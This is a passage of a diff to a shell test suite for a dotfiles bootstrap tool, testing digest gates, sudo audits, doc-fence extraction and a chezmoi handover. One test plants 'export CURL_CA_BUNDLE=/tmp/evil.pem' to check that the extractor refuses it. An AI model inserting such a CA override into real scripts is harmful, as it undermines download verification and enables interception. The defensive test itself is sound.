-        fail "run-stow refused the real $profile H7-stow block: $got; $(cat "$UNIT/real/$profile.blocks/1.block")"
-    expect_eq "real $profile run-stow lines" "$(printf '%s\n' "$got" | grep -c .)" 3
-    expect_eq "real $profile mv line" "$(printf '%s\n' "$got" | sed -n 1p)" "mv -n $(printf '%q' "$UNIT/real/My Files/.bashrc") $(printf '%q' "$UNIT/real/My Files/.bashrc.pre-dotfiles")"
-    expect_eq "real $profile stow line" "$(printf '%s\n' "$got" | sed -n 3p)" "$prefix$REAL_TAIL $host"
-    got=$(HOME="$UNIT/real/My Files" E2E_CLONE="$UNIT/real/link/dotfiles" e2e_block_lines run-stow "$host" "$UNIT/real/$profile.blocks/1.block") ||
-        fail "run-stow refused the real $profile H7-stow block through a symlinked clone: $got"
-    got=$(e2e_block_lines run-gate "$host" "$UNIT/real/$profile.blocks/2.block") ||
-        fail "run-gate refused the real $profile gate: $got; $(cat "$UNIT/real/$profile.blocks/2.block")"
+    expect_eq "real $profile blocks" "$(e2e_blocks_summary "$UNIT/real/$profile.blocks")" 'S5-claude(inspect)'
+    got=$(e2e_block_lines run-gate "$host" "$UNIT/real/$profile.blocks/1.block") ||
+        fail "run-gate refused the real $profile gate: $got; $(cat "$UNIT/real/$profile.blocks/1.block")"
     case $got in
         "printf '%s  %s\\n' $SHA $(printf '%q' "$UNIT/real/My Files/.cache/dotfiles-bootstrap/claude/install.sh") | "*) ;;
         *) fail "real $profile gate is [$got]" ;;
     esac
 done <<'ROWS'
-debian|lab-ubuntu|/home/linuxbrew/.linuxbrew/bin/brew|PATH="/home/linuxbrew/.linuxbrew/bin:$PATH"
-macos|mac|/opt/my brew/bin/brew|PATH=/opt/my\ brew/bin:"$PATH"
-hpc|sherlock|/none|PATH="$HOME/micromamba/envs/login/bin:$PATH"
+debian|lab-ubuntu
+macos|mac
+hpc|sherlock
 ROWS
-expect_eq 'real macos verifier' "$(grep -c 'shasum -a 256 -c --status -' "$UNIT/real/macos.blocks/2.block")" 1
-expect_eq 'real debian verifier' "$(grep -c 'sha256sum -c --status -' "$UNIT/real/debian.blocks/2.block")" 1
+expect_eq 'real macos verifier' "$(grep -c 'shasum -a 256 -c --status -' "$UNIT/real/macos.blocks/1.block")" 1
+expect_eq 'real debian verifier' "$(grep -c 'sha256sum -c --status -' "$UNIT/real/debian.blocks/1.block")" 1
 
 # The digest gate: exactly one line of the printed shape, both verifiers,
 # and nothing but notes besides it. A gate without --status, the Homebrew
@@ -437,7 +478,6 @@ BLOCK
 expect_eq 'run-gate line' "$(e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect.block")" "$GATE"
 sed 's/sha256sum -c --status -/shasum -a 256 -c --status -/' "$UNIT/inspect.block" >"$UNIT/inspect-mac.block"
 expect_eq 'run-gate shasum' "$(e2e_block_lines run-gate mac "$UNIT/inspect-mac.block" | grep -c 'shasum -a 256 -c --status -')" 1
-GATE_SPACE="printf '%s  %s\\n' $SHA /home/u/My\\ Files/.cache/dotfiles-bootstrap/claude/install.sh | sha256sum -c --status - && bash /home/u/My\\ Files/.cache/dotfiles-bootstrap/claude/install.sh"
 printf '%s\n' "$GATE_SPACE" >"$UNIT/inspect-space.block"
 expect_eq 'run-gate %q path with a space' "$(e2e_block_lines run-gate lab-ubuntu "$UNIT/inspect-space.block")" "$GATE_SPACE"
 for variant in 's/ --status//' 's/&& bash /\&\& NONINTERACTIVE=1 \/bin\/bash /' \
@@ -511,18 +551,18 @@ expect_eq 'failure detail' "$(e2e_failure_detail "$UNIT/failed.out" "$UNIT/faile
 printf '%s\n' '[dotfiles] [error] unknown host: nope' >"$UNIT/usage.err"
 expect_eq 'failure detail fallback' "$(e2e_failure_detail "$UNIT/empty" "$UNIT/usage.err")" '[dotfiles] [error] unknown host: nope'
 
-# The wrappers.log audit: human and negative phases pass, as does the
-# doctor's bare `stow --version` probe in a check phase; any other check
-# phase or no phase fails; on a host without sudo any sudo line fails.
+# The wrappers.log audit: human and negative phases pass; any other phase
+# or no phase fails, whatever the tool and its arguments (no probe is
+# exempt); on a host without sudo any sudo line fails.
 printf '%s\t%s\t%s\t%s\t%s\t%s\n' 1700000000 human:H1-apt-core sudo 42 'bash -c sudo apt-get update' 'apt-get update' \
     1700000010 negative:root-refused sudo 43 'bash' '-n ./setup-host.sh --host lab-ubuntu --check' \
-    1700000015 check:doctor-initial stow 47 'doctor.sh' '--version' \
-    1700000020 human:H7-stow stow 44 'stow-all.sh' '-n --restow -d common zsh' >"$UNIT/wrappers.log"
+    1700000015 human:H1-locale sudo 47 'bash -c sudo locale-gen en_US.UTF-8' 'locale-gen en_US.UTF-8' \
+    1700000020 human:H7-chsh chsh 44 'bash -c chsh -s /usr/bin/zsh' '-s /usr/bin/zsh' >"$UNIT/wrappers.log"
 bad=$(e2e_audit_wrappers "$UNIT/wrappers.log") || fail "wrappers audit failed a clean log: $bad"
 if bad=$(e2e_audit_no_sudo "$UNIT/wrappers.log"); then
     fail 'no-sudo audit passed a log with sudo lines'
 fi
-expect_eq 'no-sudo audit lines' "$(printf '%s\n' "$bad" | grep -c .)" 2
+expect_eq 'no-sudo audit lines' "$(printf '%s\n' "$bad" | grep -c .)" 3
 cp "$UNIT/wrappers.log" "$UNIT/wrappers-bad.log"
 printf '%s\t%s\t%s\t%s\t%s\t%s\n' 1700000030 check:doctor-initial sudo 45 'doctor.sh' '-n true' \
     1700000040 - chsh 46 'installer' '-s /usr/bin/zsh' >>"$UNIT/wrappers-bad.log"
@@ -534,6 +574,14 @@ case $bad in
     *check:doctor-initial*"$E2E_NL"*"${TAB}-${TAB}chsh"*) ;;
     *) fail "wrappers audit named the wrong lines: $bad" ;;
 esac
+# A version probe in a check phase is a finding too: the doctor's old stow
+# probe exemption is gone with the stow wrapper.
+cp "$UNIT/wrappers.log" "$UNIT/wrappers-probe.log"
+printf '%s\t%s\t%s\t%s\t%s\t%s\n' 1700000050 check:doctor-initial stow 48 'doctor.sh' '--version' >>"$UNIT/wrappers-probe.log"
+if bad=$(e2e_audit_wrappers "$UNIT/wrappers-probe.log"); then
+    fail 'wrappers audit passed a version probe in a check phase'
+fi
+expect_eq 'wrappers audit names the probe' "$(printf '%s\n' "$bad" | cut -f 2,3,6 | tr '\t' ' ')" 'check:doctor-initial stow --version'
 
 # The login shell's stderr filter drops only what a missing terminal causes
 # (the stty line, fzf's zle option restore) and keeps everything else.
@@ -561,11 +609,11 @@ expect_eq 'login text filter keeps text' "$(e2e_login_text "$UNIT/login-text.out
 # (/usr/local/bin and $E2E_OUT/bin): the first logs the call once and runs
 # the real tool, skipping the other copy, and with no real tool both give up
 # with 127 instead of exec'ing each other. PATH holds only the copies, the
-# fake real tool and the few utilities the wrapper uses, so a stow or sudo
+# fake real tool and the few utilities the wrapper uses, so a chsh or sudo
 # of the test machine is never reached.
 WRAP="$UNIT/wrap"
 mkdir -p "$WRAP/a" "$WRAP/b" "$WRAP/real" "$WRAP/util" "$WRAP/out"
-for tool in stow sudo; do
+for tool in chsh sudo; do
     cp "$REPO_ROOT/tests/e2e/wrappers/$tool" "$WRAP/a/$tool"
     cp "$REPO_ROOT/tests/e2e/wrappers/$tool" "$WRAP/b/$tool"
     chmod 755 "$WRAP/a/$tool" "$WRAP/b/$tool"
@@ -574,8 +622,8 @@ for util in grep tr date mkdir ps dirname cat; do
     found=$(command -v "$util") || fail "the wrapper test needs $util"
     ln -s "$found" "$WRAP/util/$util"
 done
-printf '#!/bin/sh\necho "real stow $*"\n' >"$WRAP/real/stow"
-chmod 755 "$WRAP/real/stow"
+printf '#!/bin/sh\necho "real chsh $*"\n' >"$WRAP/real/chsh"
+chmod 755 "$WRAP/real/chsh"
 # timeout is named by its full path: the PATH prefix below also governs the
 # lookup of the command it precedes.
 WRAP_LIMIT=$(command -v timeout 2>/dev/null) || WRAP_LIMIT=
@@ -588,8 +636,8 @@ wrap_run() {
     fi
     printf '%s\n' "$status"
 }
-expect_eq 'two wrapper copies reach the real tool' "$(wrap_run "$WRAP/a:$WRAP/b:$WRAP/real:$WRAP/util" stow)" 0
-expect_eq 'the real tool ran once' "$(cat "$WRAP/run.out")" 'real stow --version'
+expect_eq 'two wrapper copies reach the real tool' "$(wrap_run "$WRAP/a:$WRAP/b:$WRAP/real:$WRAP/util" chsh)" 0
+expect_eq 'the real tool ran once' "$(cat "$WRAP/run.out")" 'real chsh --version'
 expect_eq 'one log line for one call' "$(grep -c . "$WRAP/out/log/wrappers.log")" 1
 expect_eq 'two wrapper copies and no real tool give up' "$(wrap_run "$WRAP/a:$WRAP/b:$WRAP/util" sudo)" 127
 expect_eq 'the give-up message' "$(cat "$WRAP/run.out")" 'e2e wrapper: real sudo not found'
@@ -645,7 +693,7 @@ if date -d @0 +%s >/dev/null 2>&1; then
             "$(date -d @1700000010 '+%b %e %T %Y')"
         printf '%s : tester : TTY=unknown ; PWD=/home/tester ; USER=root ; COMMAND=/usr/bin/apt-get install -y\n' \
             "$(date -d @1700000100 '+%b %e %T %Y')"
-        printf '    zsh stow\n'
+        printf '    zsh git\n'
         printf '%s : tester : TTY=unknown ; PWD=/home/tester/dotfiles ; USER=root ; COMMAND=./setup-host.sh\n' \
             "$(date -d @1700000205 '+%b %e %T %Y')"
     } >"$UNIT/sudo.log"
@@ -676,20 +724,25 @@ expect_eq 'helpers define both' "$(grep -cE '^(fetch_pinned|clone_listed)\(\) \{
 expect_eq 'helpers hold nothing else in column 0' "$(grep -cvE '^(#|[ \t]|\}$|fetch_pinned\(\) \{$|clone_listed\(\) \{$|$)' "$UNIT/helpers.sh")" 0
 # LINE reaches awk through the environment: macOS awk (the One True AWK)
 # refuses a newline in a -v assignment, and the third case plants three lines.
-plant_fence() { # DOC OUT LINE: LINE just before the fence's closing ```
-    E2E_PLANT=$3 awk '/^#+ Downloads and clones by hand/ { s = 1 } s && !i && /^```sh/ { i = 1 } i && !p && /^```$/ { print ENVIRON["E2E_PLANT"]; p = 1 } { print }' "$1" >"$2"
+plant_fence() { # DOC HEADING OUT LINE: LINE just before the closing ``` of the fence after HEADING
+    E2E_PLANT=$4 E2E_PLANT_HEADING=$2 awk '
+        index($0, "# " ENVIRON["E2E_PLANT_HEADING"]) && /^#+ / { s = 1 }
+        s && !i && /^```sh/ { i = 1 }
+        i && !p && /^```$/ { print ENVIRON["E2E_PLANT"]; p = 1 }
+        { print }
+    ' "$1" >"$3"
 }
-plant_fence "$REPO_ROOT/docs/bootstrap.md" "$UNIT/bootstrap-planted.md" 'fetch_pinned claude'
+plant_fence "$REPO_ROOT/docs/bootstrap.md" 'Downloads and clones by hand' "$UNIT/bootstrap-planted.md" 'fetch_pinned claude'
 if e2e_extract_helpers "$UNIT/bootstrap-planted.md" "$UNIT/helpers-planted.sh" >"$UNIT/helpers-planted.out"; then
     fail 'extract_helpers accepted a top-level line after the definitions'
 fi
 expect_eq 'planted line named' "$(cat "$UNIT/helpers-planted.out")" 'a line outside the fetch_pinned and clone_listed definitions in the fenced sh block: fetch_pinned claude'
-plant_fence "$REPO_ROOT/docs/bootstrap.md" "$UNIT/bootstrap-planted.md" '    export CURL_CA_BUNDLE=/tmp/evil.pem'
+plant_fence "$REPO_ROOT/docs/bootstrap.md" 'Downloads and clones by hand' "$UNIT/bootstrap-planted.md" '    export CURL_CA_BUNDLE=/tmp/evil.pem'
 if e2e_extract_helpers "$UNIT/bootstrap-planted.md" "$UNIT/helpers-planted.sh" >"$UNIT/helpers-planted.out"; then
     fail 'extract_helpers accepted an indented top-level line'
 fi
 expect_eq 'indented planted line named' "$(cat "$UNIT/helpers-planted.out")" 'a line outside the fetch_pinned and clone_listed definitions in the fenced sh block:     export CURL_CA_BUNDLE=/tmp/evil.pem'
-plant_fence "$REPO_ROOT/docs/bootstrap.md" "$UNIT/bootstrap-planted.md" 'helper_three() {
+plant_fence "$REPO_ROOT/docs/bootstrap.md" 'Downloads and clones by hand' "$UNIT/bootstrap-planted.md" 'helper_three() {
     :
 }'
 if e2e_extract_helpers "$UNIT/bootstrap-planted.md" "$UNIT/helpers-planted.sh" >"$UNIT/helpers-planted.out"; then
@@ -701,16 +754,311 @@ if e2e_extract_helpers "$UNIT/bootstrap-moved.md" "$UNIT/helpers-moved.sh" >"$UN
     fail 'extract_helpers found a fence without the heading'
 fi
 expect_eq 'moved heading named' "$(cat "$UNIT/helpers-moved.out")" 'no fenced sh block after "Downloads and clones by hand"'
-printf 'ok: block parser, policy, gate, alloc, audit parsers and by-hand helpers\n'
+
+# The by-hand chezmoi route: the extracted fetch_pinned, under a curl that
+# records its URL and fails, asks for the generic Linux archive of the
+# pinned release for each architecture, so a reordered installers.tsv (a
+# musl or macOS row first) fails here; and the S4-chezmoi line the other
+# flow runs is the documented one.
+FP_HOME="$UNIT/fp home"
+mkdir -p "$FP_HOME/dotfiles/config/bootstrap" "$UNIT/fp-bin" "$UNIT/fp-tmp"
+cp "$REPO_ROOT/config/bootstrap/installers.tsv" "$FP_HOME/dotfiles/config/bootstrap/installers.tsv"
+printf '#!/bin/sh\nfor a do u=$a; done\nprintf "%%s\\n" "$u" >>"$E2E_FP_LOG"\nexit 1\n' >"$UNIT/fp-bin/curl"
+chmod 755 "$UNIT/fp-bin/curl"
+CZ_VERSION=$(cat "$REPO_ROOT/.chezmoiversion")
+for row in 'x86_64 amd64' 'aarch64 arm64'; do
+    : >"$UNIT/fp.log"
+    fp_rc=0
+    env -i HOME="$FP_HOME" PATH="$UNIT/fp-bin:/usr/bin:/bin" TMPDIR="$UNIT/fp-tmp" E2E_FP_LOG="$UNIT/fp.log" \
+        "$BASH" -c ". $(e2e_quote "$UNIT/helpers.sh") && fetch_pinned chezmoi ${row%% *}" >/dev/null 2>&1 || fp_rc=$?
+    expect_eq "fetch_pinned chezmoi ${row%% *} fails with the curl stub" "$fp_rc" 1
+    case $(cat "$UNIT/fp.log") in
+        */chezmoi_"${CZ_VERSION}"_linux_"${row#* }".tar.gz) ;;
+        *) fail "fetch_pinned chezmoi ${row%% *} requested [$(cat "$UNIT/fp.log")], not the generic linux_${row#* } archive" ;;
+    esac
+done
+grep -F -- "$E2E_CHEZMOI_LINE" "$REPO_ROOT/docs/bootstrap.md" >/dev/null ||
+    fail 'docs/bootstrap.md lacks the by-hand S4-chezmoi line the other flow runs (E2E_CHEZMOI_LINE)'
+printf 'ok: block parser, policy, verdicts, gate, alloc, audit parsers and by-hand helpers\n'
+
+# "Fresh home by hand": the real fence defines exactly native_cz and
+# native_handover; a planted top-level line and a moved heading are refused
+# by name, as the by-hand helpers are.
+e2e_extract_fence "$REPO_ROOT/docs/bootstrap.md" 'Fresh home by hand' "$UNIT/fresh.sh" native_cz native_handover ||
+    fail 'e2e_extract_fence refused the Fresh home by hand fence'
+expect_eq 'fresh home defines both' "$(grep -cE '^(native_cz|native_handover)\(\) \{$' "$UNIT/fresh.sh")" 2
+expect_eq 'fresh home holds nothing else in column 0' "$(grep -cvE '^(#|[ \t]|\}$|native_cz\(\) \{$|native_handover\(\) \{$|$)' "$UNIT/fresh.sh" || true)" 0
+plant_fence "$REPO_ROOT/docs/bootstrap.md" 'Fresh home by hand' "$UNIT/fresh-planted.md" 'native_handover lab-ubuntu'
+if e2e_extract_fence "$UNIT/fresh-planted.md" 'Fresh home by hand' "$UNIT/fresh-planted.sh" native_cz native_handover >"$UNIT/fresh-planted.out"; then
+    fail 'e2e_extract_fence accepted a top-level call in the fresh home fence'
+fi
+expect_eq 'fresh home planted line named' "$(cat "$UNIT/fresh-planted.out")" 'a line outside the native_cz and native_handover definitions in the fenced sh block: native_handover lab-ubuntu'
+sed 's/^#### Fresh home by hand/#### Fresh home, by hand/' "$REPO_ROOT/docs/bootstrap.md" >"$UNIT/fresh-moved.md"
+if e2e_extract_fence "$UNIT/fresh-moved.md" 'Fresh home by hand' "$UNIT/fresh-moved.sh" native_cz native_handover >"$UNIT/fresh-moved.out"; then
+    fail 'e2e_extract_fence found the fresh home fence without its heading'
+fi
+expect_eq 'fresh home moved heading named' "$(cat "$UNIT/fresh-moved.out")" 'no fenced sh block after "Fresh home by hand"'
+if e2e_extract_fence "$REPO_ROOT/docs/bootstrap.md" 'Fresh home by hand' "$UNIT/fresh-third.sh" native_cz native_handover native_third >"$UNIT/fresh-third.out"; then
+    fail 'e2e_extract_fence accepted a fence without a requested definition'
+fi
+expect_eq 'fresh home missing definition named' "$(cat "$UNIT/fresh-third.out")" 'the fenced sh block lacks a "native_cz() {" or a "native_handover() {" or a "native_third() {" line'
+printf 'ok: Fresh home by hand extraction\n'
+
+# The two functions, run as a person pastes them, against the stub chezmoi
+# in a fresh home whose name has a space (an /etc/skel .bashrc, a clone with
+# .chezmoiroot at ~/dotfiles), under bash, sh and zsh.
+CZBIN="$UNIT/czbin"
+mkdir -p "$CZBIN" "$UNIT/shells"
+write_chezmoi_stub "$CZBIN/chezmoi"
+fresh_home() { # NAME: a fresh home in FRESH_HOME, its stub log in FRESH_LOG
+    FRESH_HOME="$UNIT/fresh/$1/home dir"
+    FRESH_LOG="$UNIT/fresh/$1/stub.log"
+    mkdir -p "$FRESH_HOME/dotfiles"
+    printf 'home\n' >"$FRESH_HOME/dotfiles/.chezmoiroot"
+    printf '# /etc/skel\n' >"$FRESH_HOME/.bashrc"
+    : >"$FRESH_LOG"
+}
+# fresh_run SHELL CODE [NAME=value...]: CODE after the extracted functions,
+# in SHELL, from FRESH_CWD (default the clone), in an environment of HOME,
+# the stub's PATH and NAME=value only; FRESH_RC is its exit code.
+fresh_run() {
+    local shell=$1 code=$2
+    shift 2
+    FRESH_RC=0
+    (cd "${FRESH_CWD:-$FRESH_HOME/dotfiles}" &&
+        exec env -i HOME="$FRESH_HOME" PATH="$CZBIN:/usr/bin:/bin" LC_ALL=C E2E_STUB_LOG="$FRESH_LOG" "$@" \
+            "$shell" -c ". $(e2e_quote "$UNIT/fresh.sh") && $code") >"$FRESH_HOME.out" 2>"$FRESH_HOME.err" || FRESH_RC=$?
+}
+expect_refusal() { # NAME TEXT: FRESH_RC 1, TEXT on stderr, no apply and no binding written
+    expect_eq "$1: exit" "$FRESH_RC" 1
+    expect_text "$1: stderr" "$FRESH_HOME.err" "$2"
+    expect_no_text "$1: no apply" "$FRESH_LOG" apply
+    [ ! -s "$FRESH_HOME/.config/dotfiles/native" ] || fail "$1: a binding was written"
+}
+for shell in bash sh zsh; do
+    case $shell in
+        bash) exe=$BASH ;;
+        sh) exe=/bin/sh ;;
+        zsh)
+            if ! zsh_path=$(command -v zsh); then
+                printf 'SKIP: Fresh home by hand under zsh (zsh unavailable).\n'
+                continue
+            fi
+            # -f: no startup file of the test machine's zsh.
+            printf '#!/bin/sh\nexec %s -f "$@"\n' "$zsh_path" >"$UNIT/shells/zsh"
+            chmod 755 "$UNIT/shells/zsh"
+            exe=$UNIT/shells/zsh
+            ;;
+    esac
+    fresh_home "proto-$shell"
+    fresh_run "$exe" 'native_handover lab-ubuntu'
+    [ "$FRESH_RC" = 0 ] || {
+        cat "$FRESH_HOME.err" >&2
+        fail "native_handover under $shell exited $FRESH_RC"
+    }
+    phys_home=$(cd -P "$FRESH_HOME" && pwd -P)
+    expect_eq "fresh $shell call order" "$(cat "$FRESH_LOG")" "init
+managed --include=dirs
+managed --include=files,symlinks
+apply --include=dirs --recursive=false $phys_home/.config/sh
+apply --include=dirs --recursive=false $phys_home/.ssh
+apply --exclude=dirs
+apply --exclude=dirs
+diff --exclude=dirs"
+    printf '%s\n' dotfiles-chezmoi-v1 "$phys_home" "$phys_home/dotfiles" >"$UNIT/fresh/want-native"
+    cmp -s "$UNIT/fresh/want-native" "$FRESH_HOME/.config/dotfiles/native" || fail "fresh $shell binding bytes: $(cat "$FRESH_HOME/.config/dotfiles/native")"
+    expect_eq "fresh $shell binding mode" "$(ls -l "$FRESH_HOME/.config/dotfiles/native" | cut -c1-10)" '-rw-------'
+    printf 'umask = 0o077\n\n[data]\nhost = "lab-ubuntu"\n' >"$UNIT/fresh/want-config"
+    cmp -s "$UNIT/fresh/want-config" "$FRESH_HOME/.config/chezmoi/chezmoi.toml" || fail "fresh $shell seed config: $(cat "$FRESH_HOME/.config/chezmoi/chezmoi.toml")"
+    expect_eq "fresh $shell backup mode" "$(ls -ld "$FRESH_HOME/.local/state/dotfiles-fresh-backup" | cut -c1-10)" 'drwx------'
+    printf '# /etc/skel\n' >"$UNIT/fresh/want-bashrc"
+    cmp -s "$UNIT/fresh/want-bashrc" "$FRESH_HOME/.local/state/dotfiles-fresh-backup/.bashrc" || fail "fresh $shell kept no copy of the skel .bashrc"
+    [ ! -e "$FRESH_HOME/.local/state/dotfiles-fresh-backup/.profile" ] || fail "fresh $shell copied a .profile that did not exist"
+    [ ! -e "$FRESH_HOME/.config/dotfiles/maintenance" ] || fail "fresh $shell created maintenance"
+    [ ! -e "$FRESH_HOME/.config/chezmoi/chezmoistate.boltdb" ] || fail "fresh $shell left a stray state database"
+    [ -s "$FRESH_HOME/.local/state/chezmoi/chezmoi.boltdb" ] || fail "fresh $shell has no bound state database"
+    expect_eq "fresh $shell targets" "$(cat "$FRESH_HOME/.bashrc")" '# native .bashrc'
+    expect_text "fresh $shell result" "$FRESH_HOME.out" 'native_handover: lab-ubuntu deployed; copies of the files it replaced are in ~/.local/state/dotfiles-fresh-backup'
+done
+
+# Each refusal exits 1 before a target or the binding is written, and
+# before the seed config exists when there was none: an earlier native
+# install, maintenance, a local config, a state database or the backup
+# directory; a role it does not know (win has its own procedure); a shell
+# outside the clone.
+for rel in .config/dotfiles/native .config/dotfiles/maintenance .config/chezmoi/chezmoi.toml \
+    .local/state/chezmoi/chezmoi.boltdb .local/state/dotfiles-fresh-backup; do
+    fresh_home "exists$(printf '%s' "$rel" | tr '/.' '--')"
+    mkdir -p "$(dirname "$FRESH_HOME/$rel")"
+    : >"$FRESH_HOME/$rel"
+    fresh_run "$BASH" 'native_handover lab-ubuntu'
+    expect_refusal "fresh refusal for ~/$rel" "native_handover: ~/$rel exists, so this is no fresh home; follow docs/chezmoi-migration/takeover.md"
+    [ "$rel" = .config/chezmoi/chezmoi.toml ] || [ ! -e "$FRESH_HOME/.config/chezmoi/chezmoi.toml" ] ||
+        fail "fresh refusal for ~/$rel created the seed config"
+    expect_eq "fresh refusal for ~/$rel ran no chezmoi" "$(cat "$FRESH_LOG")" ''
+done
+for role in win nope ''; do
+    fresh_home "role-${role:-empty}"
+    fresh_run "$BASH" "native_handover $(e2e_quote "$role")"
+    expect_refusal "fresh role [$role]" 'native_handover: name the role: common-only, mac, wsl-ubuntu, lab-ubuntu, sherlock or marlowe'
+    [ ! -e "$FRESH_HOME/.config/chezmoi/chezmoi.toml" ] || fail "fresh role [$role] created the seed config"
+done
+fresh_home outside
+FRESH_CWD=$FRESH_HOME fresh_run "$BASH" 'native_handover lab-ubuntu'
+expect_refusal 'fresh outside the clone' 'native_handover: run it from the dotfiles clone'
+[ ! -e "$FRESH_HOME/.config/chezmoi/chezmoi.toml" ] || fail 'fresh outside the clone created the seed config'
+FRESH_CWD=$FRESH_HOME fresh_run "$BASH" 'native_cz managed --include=dirs'
+expect_refusal 'native_cz outside the clone' 'native_cz: run it from the dotfiles clone'
+# A link, or an entry of the wrong kind, at a managed path stops it before
+# the binding and before any apply.
+fresh_home link
+ln -s .bashrc "$FRESH_HOME/.profile"
+fresh_run "$BASH" 'native_handover lab-ubuntu'
+expect_refusal 'fresh link at ~/.profile' 'native_handover: ~/.profile is a link or not a regular file; follow docs/chezmoi-migration/takeover.md'
+fresh_home ssh-file
+: >"$FRESH_HOME/.ssh"
+fresh_run "$BASH" 'native_handover lab-ubuntu'
+expect_refusal 'fresh file at ~/.ssh' 'native_handover: ~/.ssh is not a directory; follow docs/chezmoi-migration/takeover.md'
+fresh_home dir-at-file
+mkdir -p "$FRESH_HOME/.zshrc"
+fresh_run "$BASH" 'native_handover lab-ubuntu'
+expect_refusal 'fresh directory at ~/.zshrc' 'native_handover: ~/.zshrc is a link or not a regular file'
+# Targets that still differ after the two applies stop it.
+fresh_home differ
+fresh_run "$BASH" 'native_handover lab-ubuntu' E2E_STUB_DIFF=1
+expect_eq 'fresh diff exit' "$FRESH_RC" 1
+expect_text 'fresh diff stderr' "$FRESH_HOME.err" 'native_handover: targets still differ after two applies; review native_cz diff --exclude=dirs privately'
+# Without ~/.local/bin/chezmoi and with none on PATH, native_cz names the
+# step that installs it.
+if [ -x /usr/bin/chezmoi ] || [ -x /bin/chezmoi ]; then
+    printf 'SKIP: native_cz without a chezmoi (this machine has one in /usr/bin or /bin).\n'
+else
+    fresh_home no-binary
+    fresh_run "$BASH" 'native_cz managed --include=dirs' PATH=/usr/bin:/bin
+    expect_refusal 'native_cz without a chezmoi' 'native_cz: no chezmoi; run S4-chezmoi first'
+fi
+printf 'ok: Fresh home by hand under the stub chezmoi\n'
+
+# e2e_handover_problems: the end state the native-handover step requires,
+# against a home that has it, then against one mutation at a time.
+HP="$UNIT/hp"
+mkdir -p "$HP/good/dotfiles" "$HP/good/.config/dotfiles" "$HP/good/.config/chezmoi" \
+    "$HP/good/.local/state/chezmoi" "$HP/good/.local/state/dotfiles-fresh-backup"
+hp_phys=$(cd -P "$HP/good" && pwd -P)
+printf '%s\n' dotfiles-chezmoi-v1 "$hp_phys" "$hp_phys/dotfiles" >"$HP/good/.config/dotfiles/native"
+chmod 600 "$HP/good/.config/dotfiles/native"
+printf 'umask = 63\n\n[data]\n  host = "lab-ubuntu"\n' >"$HP/good/.config/chezmoi/chezmoi.toml"
+printf 'db\n' >"$HP/good/.local/state/chezmoi/chezmoi.boltdb"
+printf '# native .zshrc\n' >"$HP/good/.zshrc"
+printf '# /etc/skel\n' >"$HP/good/.local/state/dotfiles-fresh-backup/.bashrc"
+HP_BEFORE=".bashrc=$(e2e_sha256 "$HP/good/.local/state/dotfiles-fresh-backup/.bashrc")"
+# hp_case NAME MUTATION: the problems e2e_handover_problems reports for a
+# copy of the good home after MUTATION (shell code run in that copy), then
+# the kept count, as "<problems>|<kept>".
+hp_case() {
+    rm -rf "${HP:?}/$1"
+    cp -Rp "$HP/good" "$HP/$1"
+    (cd "$HP/$1" && eval "$2")
+    (
+        HOME=$HP/$1 E2E_CLONE=$HP/$1/dotfiles E2E_RC_BEFORE=$HP_BEFORE
+        e2e_handover_problems lab-ubuntu || true
+        printf '%s|%s\n' "$E2E_HANDOVER_DETAIL" "$E2E_HANDOVER_KEPT"
+    )
+}
+fix_binding() { # the copy's binding names the copy
+    local phys
+    phys=$(pwd -P)
+    printf '%s\n' dotfiles-chezmoi-v1 "$phys" "$phys/dotfiles" >.config/dotfiles/native
+}
+expect_eq 'handover end state' "$(hp_case own 'fix_binding')" '|1'
+while IFS='|' read -r name mutation want; do
+    got=$(hp_case "$name" "fix_binding; $mutation")
+    case $got in
+        *"$want"*) ;;
+        *) fail "handover problem $name: [$got] lacks [$want]" ;;
+    esac
+done <<'ROWS'
+foreign|printf '%s\n' dotfiles-chezmoi-v1 /elsewhere /elsewhere/dotfiles >.config/dotfiles/native|~/.config/dotfiles/native is not the three-line binding of this home to the clone
+extra|printf '\n' >>.config/dotfiles/native|~/.config/dotfiles/native is not the three-line binding of this home to the clone
+mode|chmod 644 .config/dotfiles/native|~/.config/dotfiles/native is -rw-r--r--, not -rw-------
+nobinding|rm .config/dotfiles/native|~/.config/dotfiles/native is missing, a link or not a regular file
+role|printf '[data]\nhost = "mac"\n' >.config/chezmoi/chezmoi.toml|~/.config/chezmoi/chezmoi.toml does not select host lab-ubuntu
+configlink|mv .config/chezmoi/chezmoi.toml .config/chezmoi/real.toml && ln -s real.toml .config/chezmoi/chezmoi.toml|~/.config/chezmoi/chezmoi.toml is missing, a link or not a regular file
+maintenance|: >.config/dotfiles/maintenance|~/.config/dotfiles/maintenance exists
+stray|: >.config/chezmoi/chezmoistate.boltdb|~/.config/chezmoi/chezmoistate.boltdb exists
+nostate|: >.local/state/chezmoi/chezmoi.boltdb|~/.local/state/chezmoi/chezmoi.boltdb is missing or empty
+zshrc|rm .zshrc && ln -s .config .zshrc|~/.zshrc is missing, a link or not a regular file
+nocopy|rm .local/state/dotfiles-fresh-backup/.bashrc|no byte-identical copy of ~/.bashrc in ~/.local/state/dotfiles-fresh-backup
+changed|printf 'edited\n' >.local/state/dotfiles-fresh-backup/.bashrc|no byte-identical copy of ~/.bashrc in ~/.local/state/dotfiles-fresh-backup
+ROWS
+
+# The clone-link audit: a relative and an absolute link into the clone, a
+# link to a directory of it and a dangling one into it are reported; a link
+# elsewhere, a link to a sibling whose name starts like the clone's, and a
+# link inside the clone itself are not.
+CL="$UNIT/cl home"
+mkdir -p "$CL/dotfiles/common" "$CL/dotfiles-old" "$CL/.config"
+: >"$CL/dotfiles/common/x"
+: >"$CL/dotfiles-old/x"
+ln -s ../dotfiles/common/x "$CL/.config/rel"
+ln -s dotfiles/common/x "$CL/top"
+ln -s "$CL/dotfiles/common/x" "$CL/abs"
+ln -s dotfiles/common "$CL/dirlink"
+ln -s dotfiles/missing "$CL/dangling"
+ln -s /etc "$CL/other"
+ln -s dotfiles-old/x "$CL/near"
+ln -s common/x "$CL/dotfiles/inner"
+cl_out=$(HOME=$CL E2E_CLONE=$CL/dotfiles E2E_SRC=$UNIT/no-src E2E_SNAPSHOT_PRUNE='' e2e_audit_clone_links) &&
+    fail 'the clone-link audit passed a home with links into the clone'
+expect_eq 'clone links found' "$(printf '%s\n' "$cl_out" | LC_ALL=C sort)" "$CL/.config/rel
+$CL/abs
+$CL/dangling
+$CL/dirlink
+$CL/top"
+rm "$CL/.config/rel" "$CL/top" "$CL/abs" "$CL/dirlink" "$CL/dangling"
